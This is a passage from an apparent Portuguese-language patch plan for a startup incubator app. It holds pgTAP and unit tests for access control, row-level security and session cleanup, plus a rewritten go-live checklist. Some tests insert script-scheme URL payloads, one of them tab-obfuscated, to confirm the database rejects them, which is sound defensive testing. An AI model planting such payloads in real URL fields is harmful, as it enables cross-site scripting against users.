  ('5ec10000-0000-4000-8000-000000000001', 'rc12sec2-cons@test.com', 'approved'),
  ('5ec10000-0000-4000-8000-000000000002', 'rc12sec2-mentor@test.com', 'approved'),
  ('5ec10000-0000-4000-8000-000000000003', 'rc12sec2-founder@test.com', 'approved'),
  ('5ec10000-0000-4000-8000-000000000004', 'rc12sec2-member@test.com', 'approved'),
  ('5ec10000-0000-4000-8000-000000000005', 'rc12sec2-admin@test.com', 'approved')
ON CONFLICT (id) DO UPDATE SET account_status = EXCLUDED.account_status;
DELETE FROM public.user_roles WHERE user_id::text LIKE '5ec10000-%';
INSERT INTO public.user_roles (user_id, role) VALUES
  ('5ec10000-0000-4000-8000-000000000001', 'consultor'),
  ('5ec10000-0000-4000-8000-000000000002', 'mentor_externo'),
  ('5ec10000-0000-4000-8000-000000000003', 'founder'),
  ('5ec10000-0000-4000-8000-000000000005', 'admin');
INSERT INTO public.programs (id, name) VALUES ('5ec10000-0000-4000-8000-0000000000e1', 'RC12 SEC2 Program') ON CONFLICT DO NOTHING;
INSERT INTO public.startups (id, name, nif, main_contact_email) VALUES
  ('5ec10000-0000-4000-8000-0000000000b1', 'RC12 SEC2 A', '509888777', 'a@rc12sec2.test'),
  ('5ec10000-0000-4000-8000-0000000000b2', 'RC12 SEC2 B', NULL, 'b@rc12sec2.test');
INSERT INTO public.workspaces (id, startup_id, program_id, status) VALUES
  ('5ec10000-0000-4000-8000-0000000000c1', '5ec10000-0000-4000-8000-0000000000b1', '5ec10000-0000-4000-8000-0000000000e1', 'imported_unclaimed'),
  ('5ec10000-0000-4000-8000-0000000000c2', '5ec10000-0000-4000-8000-0000000000b2', '5ec10000-0000-4000-8000-0000000000e1', 'active');
INSERT INTO public.workspace_users (workspace_id, user_id, role, active) VALUES
  ('5ec10000-0000-4000-8000-0000000000c2', '5ec10000-0000-4000-8000-000000000002', 'mentor_externo', true),
  ('5ec10000-0000-4000-8000-0000000000c2', '5ec10000-0000-4000-8000-000000000003', 'founder', true);
INSERT INTO public.mentor_nda_acceptances (user_id, nda_version) VALUES ('5ec10000-0000-4000-8000-000000000002', 'PT-NDA-2026-01');

-- E2E-05: ensure_contract_workspace reutiliza a startup importada com o mesmo NIF em vez de a duplicar
INSERT INTO public.funnel_items (id, stage, type, contact_name, contact_email, organization_name, program_id)
VALUES ('5ec10000-0000-4000-8000-0000000000f1', 'approved_for_signature', 'lead', 'Rui', 'rui@rc12sec2.test', 'RC12 SEC2 A', '5ec10000-0000-4000-8000-0000000000e1');
INSERT INTO public.startup_contracts (id, status, start_date, monthly_fee, currency, funnel_item_id, organization_name, company_nif, legal_representative_name, legal_representative_email, signature_provider, signature_status, signed_at)
VALUES ('5ec10000-0000-4000-8000-0000000000f3', 'active', current_date, 100, 'EUR', '5ec10000-0000-4000-8000-0000000000f1', 'RC12 SEC2 A', '509 888 777', 'Rui', 'rui@rc12sec2.test', 'assinatura_digital', 'completed', now());
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"5ec10000-0000-4000-8000-000000000001","role":"authenticated"}', true);
SELECT is(public.ensure_contract_workspace('5ec10000-0000-4000-8000-0000000000f3'), '5ec10000-0000-4000-8000-0000000000c1'::uuid,
  'E2E-05: o contrato reutiliza o workspace importado com o mesmo NIF');
SELECT set_config('role', 'postgres', true);
SELECT is((SELECT count(*)::int FROM public.startups WHERE regexp_replace(coalesce(nif, ''), '\D', '', 'g') = '509888777'), 1,
  'E2E-05: não é criada uma startup duplicada');
SELECT is((SELECT linked_workspace_id FROM public.funnel_items WHERE id = '5ec10000-0000-4000-8000-0000000000f1'), '5ec10000-0000-4000-8000-0000000000c1'::uuid,
  'E2E-05: a lead fica ligada ao workspace importado');

-- ED3-05: um item do data room só pode apontar para documentos/atualizações do próprio workspace
INSERT INTO public.datarooms (id, workspace_id) VALUES ('5ec10000-0000-4000-8000-0000000000d1', '5ec10000-0000-4000-8000-0000000000c2');
INSERT INTO public.documents (id, workspace_id, name, document_type) VALUES
  ('5ec10000-0000-4000-8000-0000000000d2', '5ec10000-0000-4000-8000-0000000000c1', 'Doc de outro workspace', 'link'),
  ('5ec10000-0000-4000-8000-0000000000d3', '5ec10000-0000-4000-8000-0000000000c2', 'Doc do workspace', 'link');
INSERT INTO public.investor_updates (id, workspace_id, month) VALUES ('5ec10000-0000-4000-8000-0000000000d4', '5ec10000-0000-4000-8000-0000000000c1', current_date);
SELECT throws_ok($$INSERT INTO public.dataroom_items (dataroom_id, type, title, document_id) VALUES ('5ec10000-0000-4000-8000-0000000000d1', 'document', 'x', '5ec10000-0000-4000-8000-0000000000d2')$$,
  '23514', NULL, 'ED3-05: item com documento de outro workspace é recusado');
SELECT throws_ok($$INSERT INTO public.dataroom_items (dataroom_id, type, title, investor_update_id) VALUES ('5ec10000-0000-4000-8000-0000000000d1', 'investor_update', 'x', '5ec10000-0000-4000-8000-0000000000d4')$$,
  '23514', NULL, 'ED3-05: item com atualização de outro workspace é recusado');
SELECT lives_ok($$INSERT INTO public.dataroom_items (dataroom_id, type, title, document_id) VALUES ('5ec10000-0000-4000-8000-0000000000d1', 'document', 'ok', '5ec10000-0000-4000-8000-0000000000d3')$$,
  'ED3-05: item com documento do próprio workspace é aceite');

-- SCH-03 / FES-04: Nota rápida do mentor
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"5ec10000-0000-4000-8000-000000000002","role":"authenticated"}', true);
SELECT lives_ok($$INSERT INTO public.consultant_notes (workspace_id, author_id, content, is_private, visibility) VALUES ('5ec10000-0000-4000-8000-0000000000c2', '5ec10000-0000-4000-8000-000000000002', 'nota do mentor', false, 'shared_with_mentor')$$,
  'SCH-03: o mentor grava uma nota partilhada com o staff');
SELECT throws_ok($$INSERT INTO public.consultant_notes (workspace_id, author_id, content, is_private, visibility) VALUES ('5ec10000-0000-4000-8000-0000000000c2', '5ec10000-0000-4000-8000-000000000002', 'nota team', false, 'team')$$,
  '42501', NULL, 'SCH-03: visibility team (valor antigo do cliente) continua a ser recusada');
SELECT throws_ok($$INSERT INTO public.consultant_notes (workspace_id, author_id, content, is_private, visibility) VALUES ('5ec10000-0000-4000-8000-0000000000c2', '5ec10000-0000-4000-8000-000000000002', 'nota privada', true, 'private_staff')$$,
  '42501', NULL, 'SCH-03: o mentor não escreve notas privadas do staff');
SELECT is((SELECT count(*)::int FROM public.consultant_notes WHERE author_id = '5ec10000-0000-4000-8000-000000000002'), 1, 'SCH-03: o mentor lê a sua nota');
SELECT set_config('request.jwt.claims', '{"sub":"5ec10000-0000-4000-8000-000000000003","role":"authenticated"}', true);
SELECT is((SELECT count(*)::int FROM public.consultant_notes), 0, 'SCH-03: o founder não vê a nota do mentor');
SELECT set_config('request.jwt.claims', '{"sub":"5ec10000-0000-4000-8000-000000000001","role":"authenticated"}', true);
SELECT is((SELECT count(*)::int FROM public.consultant_notes WHERE author_id = '5ec10000-0000-4000-8000-000000000002'), 1, 'SCH-03: o staff vê a nota do mentor');
SELECT set_config('role', 'postgres', true);

-- FEF-11: com o interruptor ligado, um membro de workspace sem papel global também não recebe notificações
INSERT INTO public.workspace_users (workspace_id, user_id, role, active) VALUES ('5ec10000-0000-4000-8000-0000000000c2', '5ec10000-0000-4000-8000-000000000004', 'team_member', true);
INSERT INTO public.system_settings (key, value) VALUES ('notifications.founders_disabled', 'true'::jsonb)
ON CONFLICT (key) DO UPDATE SET value = 'true'::jsonb;
INSERT INTO public.notifications (user_id, type, title) VALUES
  ('5ec10000-0000-4000-8000-000000000004', 'kpi_stale', 'membro sem papel global'),
  ('5ec10000-0000-4000-8000-000000000005', 'kpi_stale', 'admin');
SELECT is((SELECT count(*)::int FROM public.notifications WHERE user_id = '5ec10000-0000-4000-8000-000000000004'), 0,
  'FEF-11: membro de workspace sem papel global não recebe notificações com o interruptor ligado');
SELECT is((SELECT count(*)::int FROM public.notifications WHERE user_id = '5ec10000-0000-4000-8000-000000000005'), 1,
  'FEF-11: o staff continua a receber notificações');

-- FEB-01 / FES-08 / FEX-01: URLs com esquema executável são recusadas pela base
SELECT throws_ok($$UPDATE public.profiles SET linkedin_url = 'javascript:alert(1)' WHERE id = '5ec10000-0000-4000-8000-000000000002'$$,
  '23514', NULL, 'FEB-01: profiles.linkedin_url recusa javascript:');
SELECT throws_ok($$UPDATE public.profiles SET linkedin_url = E'java\tscript:alert(1)' WHERE id = '5ec10000-0000-4000-8000-000000000002'$$,
  '23514', NULL, 'FEB-01: profiles.linkedin_url recusa javascript: com tabulação');
SELECT lives_ok($$UPDATE public.profiles SET linkedin_url = 'https://www.linkedin.com/in/rc12' WHERE id = '5ec10000-0000-4000-8000-000000000002'$$,
  'FEB-01: profiles.linkedin_url aceita https://');
SELECT throws_ok($$INSERT INTO public.documents (workspace_id, name, document_type, external_url) VALUES ('5ec10000-0000-4000-8000-0000000000c2', 'link mau', 'link', 'javascript:alert(1)')$$,
  '23514', NULL, 'FES-08: documents.external_url recusa javascript:');

SELECT * FROM finish();
ROLLBACK;
```

### `supabase/tests/rc12_sql_db_rls_sets.test.sql`
_(de: RLS: acesso por workspace avaliado por conjunto em vez de uma função por linha (ids: DBP-04))_

**Criar `supabase/tests/rc12_sql_db_rls_sets.test.sql`** (conteúdo exato):

```sql
-- RC12 (sql_db) · DBP-04 — politicas RLS das tabelas quentes avaliam o acesso por conjunto, com o MESMO resultado de antes.
-- Falha antes de 20261103202000_rc12_rls_set_helpers.sql (estrutura); o comportamento tem de ser identico antes e depois.
BEGIN;
SELECT plan(12);

-- ---- fixtures ---------------------------------------------------------------
INSERT INTO auth.users (id, email, email_confirmed_at) VALUES
  ('a1200000-0000-4000-8000-0000000000a1', 'rc12-adm@test.local', now()),
  ('a1200000-0000-4000-8000-0000000000a2', 'rc12-cons-pending@test.local', now()),
  ('a1200000-0000-4000-8000-0000000000a3', 'rc12-fnd-a@test.local', now()),
  ('a1200000-0000-4000-8000-0000000000a4', 'rc12-fnd-b@test.local', now());
INSERT INTO public.profiles (id, email, full_name, account_status) VALUES
  ('a1200000-0000-4000-8000-0000000000a1', 'rc12-adm@test.local', 'Adm', 'approved'),
  ('a1200000-0000-4000-8000-0000000000a2', 'rc12-cons-pending@test.local', 'Cons pending', 'pending'),
  ('a1200000-0000-4000-8000-0000000000a3', 'rc12-fnd-a@test.local', 'Fnd A', 'approved'),
  ('a1200000-0000-4000-8000-0000000000a4', 'rc12-fnd-b@test.local', 'Fnd B', 'approved')
ON CONFLICT (id) DO UPDATE SET account_status = EXCLUDED.account_status;
INSERT INTO public.user_roles (user_id, role) VALUES
  ('a1200000-0000-4000-8000-0000000000a1', 'admin'),
  ('a1200000-0000-4000-8000-0000000000a2', 'consultor'),
  ('a1200000-0000-4000-8000-0000000000a3', 'founder'),
  ('a1200000-0000-4000-8000-0000000000a4', 'founder')
ON CONFLICT DO NOTHING;
INSERT INTO public.programs (id, name) VALUES ('e1200000-0000-4000-8000-0000000000e1', 'Programa RC12 RLS');
INSERT INTO public.startups (id, name) VALUES
  ('b1200000-0000-4000-8000-000000000001', 'Startup RC12 A'),
  ('b1200000-0000-4000-8000-000000000002', 'Startup RC12 B'),
  ('b1200000-0000-4000-8000-000000000003', 'Startup RC12 C');
INSERT INTO public.workspaces (id, startup_id, program_id, status) VALUES
  ('c1200000-0000-4000-8000-000000000001', 'b1200000-0000-4000-8000-000000000001', 'e1200000-0000-4000-8000-0000000000e1', 'active'),
  ('c1200000-0000-4000-8000-000000000002', 'b1200000-0000-4000-8000-000000000002', 'e1200000-0000-4000-8000-0000000000e1', 'active'),
  ('c1200000-0000-4000-8000-000000000003', 'b1200000-0000-4000-8000-000000000003', 'e1200000-0000-4000-8000-0000000000e1', 'active');
UPDATE public.workspaces SET blocked_at = now() WHERE id = 'c1200000-0000-4000-8000-000000000003';
INSERT INTO public.workspace_users (workspace_id, user_id, role, active) VALUES
  ('c1200000-0000-4000-8000-000000000001', 'a1200000-0000-4000-8000-0000000000a3', 'founder', true),
  ('c1200000-0000-4000-8000-000000000002', 'a1200000-0000-4000-8000-0000000000a4', 'founder', true),
  ('c1200000-0000-4000-8000-000000000003', 'a1200000-0000-4000-8000-0000000000a3', 'founder', true);
INSERT INTO public.milestones (workspace_id, title) VALUES
  ('c1200000-0000-4000-8000-000000000001', 'm-a1'), ('c1200000-0000-4000-8000-000000000001', 'm-a2'),
  ('c1200000-0000-4000-8000-000000000002', 'm-b1'), ('c1200000-0000-4000-8000-000000000003', 'm-c1');

-- ---- estrutura: nenhuma politica das tabelas quentes chama a funcao de acesso por linha ----------
SELECT is((SELECT count(*)::int FROM pg_policies
            WHERE schemaname = 'public'
              AND tablename IN ('action_items','milestones','sessions','documents','kpi_values','notifications','messages','conversation_participants')
              AND (coalesce(qual, '') || ' ' || coalesce(with_check, '')) ~ '\y(has_workspace_access|can_write_workspace|is_founder|is_conversation_participant)\('),
          0, 'DBP-04: sem has_workspace_access/can_write_workspace/is_founder/is_conversation_participant por linha');
SELECT has_function('public', 'member_workspace_ids', ARRAY[]::text[], 'DBP-04: helper de conjunto member_workspace_ids existe');
SELECT is(COALESCE(has_function_privilege('anon', to_regprocedure('public.member_workspace_ids()'), 'EXECUTE'), false), true, 'DBP-04: anon pode executar (politicas TO public)');

-- ---- comportamento identico ---------------------------------------------------------------------
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"a1200000-0000-4000-8000-0000000000a3","role":"authenticated"}', true);
SELECT is((SELECT count(*)::int FROM public.milestones WHERE title LIKE 'm-%'), 2, 'founder A ve so os milestones do seu workspace ativo (o bloqueado e o de B ficam de fora)');
SELECT lives_ok($$INSERT INTO public.milestones (workspace_id, title) VALUES ('c1200000-0000-4000-8000-000000000001', 'novo-a')$$, 'founder A escreve no seu workspace');
SELECT throws_ok($$INSERT INTO public.milestones (workspace_id, title) VALUES ('c1200000-0000-4000-8000-000000000002', 'intruso')$$, '42501', NULL, 'founder A nao escreve no workspace de B');

SELECT set_config('request.jwt.claims', '{"sub":"a1200000-0000-4000-8000-0000000000a4","role":"authenticated"}', true);
SELECT is((SELECT count(*)::int FROM public.milestones WHERE title LIKE 'm-%'), 1, 'founder B ve so o seu milestone');

SELECT set_config('request.jwt.claims', '{"sub":"a1200000-0000-4000-8000-0000000000a1","role":"authenticated"}', true);
SELECT is((SELECT count(*)::int FROM public.milestones WHERE title LIKE 'm-%'), 4, 'admin aprovado ve todos');
SELECT lives_ok($$INSERT INTO public.milestones (workspace_id, title) VALUES ('c1200000-0000-4000-8000-000000000002', 'adm-b')$$, 'admin aprovado escreve em qualquer workspace');

-- consultor com conta pending: le (global), mas NAO escreve (can_write_workspace exige conta aprovada tambem a staff)
SELECT set_config('request.jwt.claims', '{"sub":"a1200000-0000-4000-8000-0000000000a2","role":"authenticated"}', true);
SELECT is((SELECT count(*)::int FROM public.milestones WHERE title LIKE 'm-%'), 4, 'consultor pending continua a ler (acesso global)');
SELECT throws_ok($$INSERT INTO public.milestones (workspace_id, title) VALUES ('c1200000-0000-4000-8000-000000000001', 'pending')$$, '42501', NULL,
  'consultor pending continua SEM poder escrever (equivalencia com can_write_workspace)');

SELECT set_config('role', 'anon', true);
SELECT set_config('request.jwt.claims', '{"role":"anon"}', true);
SELECT is((SELECT count(*)::int FROM public.milestones), 0, 'anon nao ve milestones');

SELECT * FROM finish();
ROLLBACK;
```

### `src/lib/sessionReset.test.ts`
_(de: Rascunho do modelo de investidor partilhado entre contas (ids: FEX-02))_

**Criar `src/lib/sessionReset.test.ts`** (conteúdo exato):

```
import { describe, it, expect, beforeEach } from 'vitest';
import { QueryClient } from '@tanstack/react-query';
import { resetSession } from '@/lib/sessionReset';

describe('resetSession', () => {
  beforeEach(() => { localStorage.clear(); sessionStorage.clear(); });

  it('wipes per-user keys (including investor drafts, new and legacy) and keeps theme + language', () => {
    const wiped = [
      'sl-cache-uid', 'sl-query-cache', 'sl-draft:new-lead', 'sl-last-activity',
      'sl-investor-draft:user-1:tpl-1', 'investor_template_draft_tpl-1',
      'founder_checklist_dismissed', 'quickkpi-dismissed-ws', 'shown_quickguide_user-1',
    ];
    const kept = ['theme', 'i18nextLng', 'language'];
    [...wiped, ...kept].forEach((k) => localStorage.setItem(k, '1'));
    sessionStorage.setItem('calendar_token_user-1', 'secret');

    resetSession(new QueryClient(), 'logout');

    wiped.forEach((k) => expect(localStorage.getItem(k), k).toBeNull());
    expect(localStorage.getItem('theme')).toBe('1');
    expect(localStorage.getItem('i18nextLng')).toBe('1');
    expect(sessionStorage.length).toBe(0);
  });

  it('does not drop unsaved server drafts that are deliberately kept across sessions', () => {
    localStorage.setItem('template-draft:abc', '{}');
    localStorage.setItem('contract-intake-draft:abc', '{}');
    resetSession(new QueryClient(), 'logout');
    expect(localStorage.getItem('template-draft:abc')).toBe('{}');
    expect(localStorage.getItem('contract-intake-draft:abc')).toBe('{}');
  });
});
```

### `supabase/functions/_shared/sessionRecipientsIntersect_test.ts`
_(de: send-session-invite recusa o lote inteiro por um destinatário (ids: HRD-13))_

**Criar `supabase/functions/_shared/sessionRecipientsIntersect_test.ts`** (conteúdo exato):

```
import { assertEquals, assertThrows } from 'https://deno.land/std@0.224.0/assert/mod.ts';
import { intersectSessionRecipients } from './sessionRecipients.ts';

Deno.test('intersect drops unrecorded recipients instead of rejecting the batch', () => {
  assertEquals(
    intersectSessionRecipients(['Member@test.local', 'pending@test.local', 'member@test.local'], ['member@test.local']),
    { recipients: ['member@test.local'], skipped: 1 },
  );
});
Deno.test('intersect with only unrecorded recipients returns none (caller decides)', () => {
  assertEquals(intersectSessionRecipients(['outsider@test.local'], ['member@test.local']), { recipients: [], skipped: 1 });
});
Deno.test('intersect defaults to the recorded set and still rejects malformed input', () => {
  assertEquals(intersectSessionRecipients(undefined, [' A@test.local ']), { recipients: ['a@test.local'], skipped: 0 });
  assertThrows(() => intersectSessionRecipients('a@test.local', []), Error, 'invalid_recipients');
  assertThrows(() => intersectSessionRecipients(['not-an-email'], ['a@test.local']), Error, 'invalid_recipients');
  assertThrows(() => intersectSessionRecipients(Array(51).fill('a@test.local'), []), Error, 'invalid_recipients');
});
```

### `src/components/workspace/sessions/sessionInviteOutcome.test.ts`
_(de: Convite da sessão falha em silêncio no diálogo "Agendar sessão" (ids: HRD-13, parte cliente))_

**Criar `src/components/workspace/sessions/sessionInviteOutcome.test.ts`** (conteúdo exato):

```
import { describe, it, expect } from 'vitest';
import { getSessionInviteOutcome } from './sessionInviteOutcome';

// HRD-13: o CreateSessionDialog engolia o erro de send-session-invite e o servidor passou a
// devolver `skipped` (destinatários sem conta ativa) em vez de recusar o lote inteiro.
describe('getSessionInviteOutcome', () => {
  it('sinaliza falha quando a chamada devolve erro', () => {
    expect(getSessionInviteOutcome({ data: null, error: new Error('recipient_lookup_failed') })).toEqual({ kind: 'failed' });
  });

  it('sinaliza falha quando não há resposta', () => {
    expect(getSessionInviteOutcome(null)).toEqual({ kind: 'failed' });
    expect(getSessionInviteOutcome(undefined)).toEqual({ kind: 'failed' });
  });

  it('não avisa quando todos os convites saíram', () => {
    expect(
      getSessionInviteOutcome({
        data: { message: 'Sent 2 invites', skipped: 0, results: [{ email: 'a@x.pt', success: true }, { email: 'b@x.pt', success: true }] },
        error: null,
      }),
    ).toEqual({ kind: 'ok' });
  });

  it('não avisa quando o servidor não tinha destinatários (sem skipped)', () => {
    expect(getSessionInviteOutcome({ data: { message: 'No recipients' }, error: null })).toEqual({ kind: 'ok' });
  });

  it('avisa quando há destinatários ignorados (skipped)', () => {
    expect(
      getSessionInviteOutcome({
        data: { message: 'Sent 1 invites', skipped: 2, results: [{ email: 'a@x.pt', success: true }] },
        error: null,
      }),
    ).toEqual({ kind: 'partial', notDelivered: 2 });
  });

  it('soma os envios falhados aos ignorados', () => {
    expect(
      getSessionInviteOutcome({
        data: { skipped: 1, results: [{ email: 'a@x.pt', success: true }, { email: 'b@x.pt', success: false, error: 'resend_send_failed' }] },
        error: null,
      }),
    ).toEqual({ kind: 'partial', notDelivered: 2 });
  });

  it('é falha quando todos os envios falharam', () => {
    expect(
      getSessionInviteOutcome({
        data: { skipped: 0, results: [{ email: 'a@x.pt', success: false }, { email: 'b@x.pt', success: false }] },
        error: null,
      }),
    ).toEqual({ kind: 'failed' });
  });

  it('ignora valores de skipped inválidos', () => {
    expect(getSessionInviteOutcome({ data: { skipped: 'abc', results: [] }, error: null })).toEqual({ kind: 'ok' });
    expect(getSessionInviteOutcome({ data: { skipped: -3 }, error: null })).toEqual({ kind: 'ok' });
  });
});
```

### `docs/GO_LIVE_CHECKLIST.md`
_(de: Documentos de operação desatualizados (ids: OPS-14))_

**Alterar `docs/GO_LIVE_CHECKLIST.md`** (diff; os números de linha são do ficheiro original):

````diff
--- a/docs/GO_LIVE_CHECKLIST.md
+++ b/docs/GO_LIVE_CHECKLIST.md
@@ -1,79 +1,112 @@
-# GO-LIVE CHECKLIST — 2026-03-04
-
-## Architecture Overview
-
-The launch uses a **two-phase approach** via the `open_registration` feature flag:
-
-| Phase | Flag State | Behaviour |
-|-------|-----------|-----------|
-| **Prelaunch** | `OFF` (default) | Only emails/domains in `signup_allowlist` can register |
-| **Live** | `ON` | Open registration; claim flow + pending approval still enforced |
-
-### Security Layers (always active)
-
-1. Account status defaults to `pending` → staff approves via PendingUsersManager
-2. Workspace access gated by `has_active_workspace_access` (only `active`/`claimed`)
-3. `imported_unclaimed` workspaces invisible to non-staff
-4. Claim flow at `/claim-startup` for founder↔startup association
-
----
-
-## PRE-FLIGHT (before sending the link)
-
-- [ ] **CI green on `main`** — all jobs: lint-and-build, db-tests, test, e2e
-- [ ] **Production domain in Auth redirect URLs**
-  - Lovable Cloud → Auth Settings → Redirect URLs
-  - Must include: `https://leiria-launchpad-pro.lovable.app`
-- [ ] **Feature flag `open_registration` = OFF** (prelaunch mode)
-- [ ] **Allowlist seeded** with founder emails from HubSpot import + `@startupleiria.com` domain
-- [ ] **Imported workspaces** status = `imported_unclaimed`
-- [ ] **Publish latest build** to production
-
----
-
-## SMOKE TESTS (5 min each)
-
-- [ ] **Staff login** → sees all workspaces + claim queue in Staff Cockpit
-- [ ] **Founder signup (allowlisted email)** → pending approval → approve → claim → workspace visible
-- [ ] **Founder signup (non-allowlisted email)** → blocked with "invite-only" message
-- [ ] **Founder login** → only sees own workspace, not others'
-- [ ] **Mentor login** → NDA gate → only assigned workspaces visible
-
----
-
-## GO LIVE
-
-- [ ] Send link to founders: `https://leiria-launchpad-pro.lovable.app`
-- [ ] Monitor claim queue in **Staff Cockpit → Associações** tab
-- [ ] Watch for errors in Lovable Cloud → Edge Function logs
-
----
-
-## POST-LAUNCH (when ready for open registration)
-
-- [ ] Set `open_registration` flag to **ON** via Admin → Feature Flags
-- [ ] All new signups go through: signup → pending → approve → claim
-- [ ] Optionally add more emails/domains to `signup_allowlist` for targeted invites
-
----
-
-## ROLLBACK PROCEDURES
-
-| Scenario | Action |
-|----------|--------|
-| **Critical bug** | Set `open_registration` OFF. Remove entries from `signup_allowlist` if needed. |
-| **Data leak suspected** | Verify RLS — `imported_unclaimed` workspaces hidden from non-staff. Check `has_active_workspace_access`. |
-| **Claim flow broken** | Staff can manually link users via Staff Cockpit → Associações tab. |
-| **Need to block all signups** | Set `open_registration` OFF and clear `signup_allowlist` table. |
-
----
-
-## Key Database Objects
-
-| Object | Purpose |
-|--------|---------|
-| `feature_flags` row `open_registration` | Master toggle for prelaunch vs live |
-| `signup_allowlist` table | Email/domain allowlist for prelaunch |
-| `check_signup_allowed(p_email)` RPC | Server-side allowlist check (SECURITY DEFINER) |
-| `startup_claim_requests` table | Claim queue for founder↔startup association |
-| `claim_startup()` RPC | Auto-claim by email match or queue for staff review |
+# Lista de arranque e operação (substitui a de 2026-03-04)
+
+Data de referência: 2026-11-02. Escrita para o administrador. Todas as consultas SQL são só de leitura (SQL Editor do Supabase / Lovable Cloud → Backend → SQL).
+
+## 0. Como funciona o lançamento
+
+- `open_registration` DESLIGADO (pré-lançamento): só se registam emails/domínios em `signup_allowlist`; contas ficam `pending` até um membro do staff aprovar.
+- `open_registration` LIGADO: registo aberto; aprovação e associação (claim) continuam obrigatórias.
+- Interruptores de emergência: `notifications.founders_disabled` (em `system_settings`) bloqueia todos os emails/notificações a founders; `reconciler.emergency_stop` pára o reconciliador.
+
+## 1. Antes de aceitar a primeira startup nova (20 minutos)
+
+Cada ponto diz o que se espera ver. Se algo falhar, não avance: abra o ponto correspondente da secção 5.
+
+1. (2 min) CI verde no `main` (todos os jobs, incluindo `db-pgtap-local` e `deno-test`).
+2. (3 min) Automações vivas. Esperado: nenhuma linha.
+```sql
+select job_name, health_state, last_ok, last_failed, failures_24h from automation_health_summary where health_state not in ('OK','RECOVERED') order by job_name;
+```
+3. (1 min) Jobs agendados. Esperado: `ativos = total`; qualquer job inativo é uma automação parada (compare os nomes com `automation_health_expectations`).
+```sql
+select count(*) filter (where active) as ativos, count(*) as total from cron.job;
+```
+4. (2 min) Alertas e falhas das últimas 24 h. Esperado: nenhuma linha em cada.
+```sql
+select created_at, severity, kind, payload->>'job' as job from system_alerts where created_at > now() - interval '24 hours' order by created_at desc;
+select job_name, count(*) as falhas, max(error_summary) as ultimo_erro from cron_job_runs where status = 'failed' and started_at > now() - interval '24 hours' group by 1 order by 2 desc;
+```
+5. (1 min) Erros de integração por resolver (Microsoft Graph, Teams). Esperado: nenhuma linha. Também em Definições do sistema → Integrações.
+```sql
+select created_at, integration_type, left(error_message, 120) as erro from integration_errors where resolved_at is null order by created_at desc limit 20;
+```
+6. (2 min) Cópia de segurança de produto da última noite. Esperado: `status = completed` e iniciada há menos de 26 h.
+```sql
+select started_at, completed_at, status, last_error, (select sum(v::int) from jsonb_each_text(record_counts) t(k,v)) as registos from ecosystem_snapshots order by started_at desc limit 3;
+```
+7. (2 min) Fila de notificações e sincronização de email. Esperado: nenhuma linha.
+```sql
+select state, channel, count(*), min(created_at) as mais_antiga from notification_attempts where state not in ('delivered','sent','skipped','cancelled') and created_at < now() - interval '1 hour' group by 1,2;
+select mailbox_email, sync_state, last_success_at, consecutive_failures, left(last_sync_error, 80) as erro from email_sync_status where coalesce(sync_state,'') <> 'disabled' and (last_success_at is null or last_success_at < now() - interval '2 hours' or consecutive_failures > 0);
+```
+8. (2 min) Modo de registo e interruptores. Esperado antes do lançamento: `open_registration = false`; `founders_disabled` conforme decidido.
+```sql
+select key, enabled from feature_flags where scope = 'global' and key in ('open_registration','founder_monthly_pulse','public_first_contact_booking') order by key;
+select key, value from system_settings where key in ('notifications.founders_disabled','reconciler.emergency_stop','reconciler.writes_enabled') order by key;
+```
+9. (1 min) Segurança básica. Esperado: nenhuma tabela sem RLS e pelo menos 2 administradores.
+```sql
+select c.relname from pg_class c join pg_namespace n on n.oid = c.relnamespace where n.nspname = 'public' and c.relkind = 'r' and not c.relrowsecurity order by 1;
+select count(*) as admins from user_roles ur join profiles p on p.id = ur.user_id where ur.role = 'admin' and p.account_status = 'approved';
+```
+10. (1 min) Contratos assinados com ativação por concluir e pedidos de primeiro contacto presos. Esperado: nenhuma linha.
+```sql
+select id, workspace_id, signed_at from startup_contracts where activation_sync_pending order by signed_at limit 20;
+select kind, status, attempts, left(last_error, 80) as erro, created_at from first_contact_outbox where status in ('pending','in_progress','failed') and created_at < now() - interval '30 minutes' order by created_at;
+```
+11. (1 min) Buckets de ficheiros. Esperado: só `public-assets` com `public = true`.
+```sql
+select id, public from storage.buckets order by public desc, id;
+```
+12. (2 min, manual) Enviar um email de teste a si próprio (Definições → Integrações) e confirmar que chega e que o remetente é `noreply@startupleiria.com` (domínio verificado no Resend). Abrir `graph-config-status` (Definições → Integrações) e confirmar Graph OK.
+
+## 2. Verificação semanal (segunda-feira, 10 minutos)
+
+1. Executar os pontos 2, 4, 5, 6, 7 e 12 da secção 1.
+2. Painel Admin → Saúde do Sistema: alertas dos últimos 7 dias (`system_alerts`) e falhas de cron.
+3. Contagem de pedidos de contas pendentes de aprovação e de pedidos de associação (claim) com mais de 3 dias.
+4. Confirmar que a última cópia de segurança abre (manifesto `snapshots/<data>/manifest.json` no bucket `ecosystem-backups`) e que `record_counts` não desceu mais de 20 % face à semana anterior.
+5. Primeira segunda-feira do mês: confirmar que `open-monthly-founder-pulse` correu (só se a flag `founder_monthly_pulse` estiver ligada).
+6. Trimestral: rodar `CRON_SECRET`, `WEBHOOK_SECRET`, `PANDADOC_*`, `DOCUSIGN_*`; ensaiar um restauro (secção 4).
+
+## 3. Variáveis de ambiente das funções edge (inventário real)
+
+Definidas em Lovable Cloud → Backend → Secrets. Obrigatórias: as que o produto usa todos os dias.
+
+| Variável | Obrigatória | Para quê |
+|---|---|---|
+| `SUPABASE_URL`, `SUPABASE_SERVICE_ROLE_KEY`, `SUPABASE_ANON_KEY` | sim (automáticas) | Todas as funções |
+| `RESEND_API_KEY` | sim | Todos os emails (21 funções); domínio `startupleiria.com` verificado |
+| `CRON_SECRET` | sim | Herança: funções aceitam também `x-cron-secret`; o caminho principal é o token de uso único |
+| `WEBHOOK_SECRET` | sim | `docusign-webhook`, `inbound-email-webhook`, `webhook-meeting-ingest` |
+| `LOVABLE_API_KEY` | sim (automática) | Funcionalidades de IA |
+| `PUBLIC_APP_URL` | sim | Ligações nos emails (20 funções). Por omissão `https://fb.startupleiria.com` |
+| `APP_URL`, `SITE_URL` | sim, com o MESMO valor de `PUBLIC_APP_URL` | Usadas por 6 e 3 funções (calendar-feed, check-missed-milestones, recompute-health-scores, public-book-first-contact, send-message-email-alert, sync-outlook-calendar; automation-engine, send-announcement-email, send-email-digest) |
+| `ALLOWED_ORIGINS` | opcional | Lista CORS separada por vírgulas; sem ela vale a lista por omissão em `_shared/cors.ts` |
